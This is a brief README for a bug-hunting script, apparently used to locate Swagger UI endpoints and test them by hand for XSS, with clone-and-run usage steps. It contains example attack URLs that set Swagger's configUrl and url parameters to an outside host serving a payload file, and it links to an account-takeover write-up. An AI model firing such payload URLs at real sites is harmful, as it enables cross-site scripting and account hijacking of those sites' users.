#### swAPI-XSS to find swagger api directories and test manually for potential XSS vulnerability

##### Example:
#####  https://www.target.com/swagger-ui/index.html?configUrl=https://jumpy-floor.surge.sh/test.json
##### or
##### https://www.target.com/swagger-ui/index.html?url=https://jumpy-floor.surge.sh/test.yaml

[Click here to read about the swagger API XSS](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)


Usage:

```
git clone https://github.com/Nightmre/swAPI-XSS.git
cd swAPI-XSS
chmod +x swxss.sh
./swxss.sh list.txt
```
